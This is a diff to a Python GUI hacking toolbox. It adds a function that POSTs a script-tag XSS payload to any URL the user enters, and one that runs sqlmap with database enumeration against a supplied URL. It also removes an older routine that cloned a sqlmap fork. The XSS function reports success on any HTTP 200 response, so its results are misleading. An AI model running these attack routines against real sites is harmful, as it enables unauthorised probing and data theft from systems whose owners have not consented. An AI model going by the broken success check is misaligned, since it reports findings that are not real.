@@ -37,11 +37,11 @@ class MenuGUI:
             if choice == "Information Gathering":
                 self.info()
             elif choice == "XSS Tracer":
-                self.xsstracer_function()
+                self.perform_xss_attack()
             elif choice == "Wordpress":
                 self.wpscan_scan()
             elif choice == "SQL-injection":
-                self.sqlmap()
+                self.sqlmap_attack()
             elif choice == "tesssstte":
                 self.tesssstte_function()
             elif choice == "Generate Report":
@@ -63,31 +63,28 @@ class MenuGUI:
             report_file.write("</body></html>")
         messagebox.showinfo("Report Generated", f"HTML report for {category} has been generated: {report_filename}")
 
+    def perform_xss_attack(self):
+        url = simpledialog.askstring("XSS Tracer", "Enter the URL to perform XSS attack on:")
+        if url:
+            # Définir le payload XSS
+            payload = "<script>alert('XSS Attack!')</script>"
 
+            # Créer les données du formulaire avec le payload XSS
+            form_data = {
+                "input_field": payload
+            }
 
-def perform_xss_attack(self):
-    url = simpledialog.askstring("XSS Tracer", "Enter the URL to perform XSS attack on:")
-    if url:
-        # Définir le payload XSS
-        payload = "<script>alert('XSS Attack!')</script>"
+            try:
+                # Envoyer la requête POST avec les données du formulaire
+                response = requests.post(url, data=form_data)
 
-        # Créer les données du formulaire avec le payload XSS
-        form_data = {
-            "input_field": payload
-        }
-
-        try:
-            # Envoyer la requête POST avec les données du formulaire
-            response = requests.post(url, data=form_data)
-
-            # Vérifier si la requête a réussi
-            if response.status_code == 200:
-                print("XSS Attack successful!")
-            else:
-                print("XSS Attack failed. Status code:", response.status_code)
-        except requests.exceptions.RequestException as e:
-            print("An error occurred:", e)
-
+                # Vérifier si la requête a réussi
+                if response.status_code == 200:
+                    print("XSS Attack successful!")
+                else:
+                    print("XSS Attack failed. Status code:", response.status_code)
+            except requests.exceptions.RequestException as e:
+                print("An error occurred:", e)
 
     def wpscan_scan(self):
         site_url = simpledialog.askstring("Wordpress", "Enter the Wordpress site URL:")
@@ -101,21 +98,14 @@ def perform_xss_attack(self):
     def info(self):
         print("Info function not implemented yet.")
 
-    def sqlmap(self):
-        yes = ['Y', 'y', 'yes', 'Yes']
-        no = ['N', 'n', 'no', 'No']
-
-        print("usage : python sqlmap.py -h")
-        choice8 = input("Continue: y/n :")
-        if choice8 in yes:
-            subprocess.run(["git", "clone", "https://github.com/padac78/sqlmap", "sqlmap-dev"])
-        elif choice8 in no:
-            subprocess.run(["clear"])
-            self.info()
-        elif choice8 == "":
-            self.menu()
-        else: 
-            self.menu()
+    def sqlmap_attack(self):
+        url = simpledialog.askstring("SQLMap", "Enter the URL to perform SQLMap attack on:")
+        if url:
+            try:
+                # Exécuter SQLMap avec l'URL fournie en argument
+                subprocess.run(["sqlmap", "-u", url, "--dbs"])
+            except FileNotFoundError:
+                print("SQLMap n'a pas été trouvé sur votre système. Assurez-vous qu'il est installé et accessible dans votre chemin d'exécution.")
 
     def tesssstte_function(self):
         messagebox.showinfo("tesssstte", "tesssstte feature will be implemented soon.")
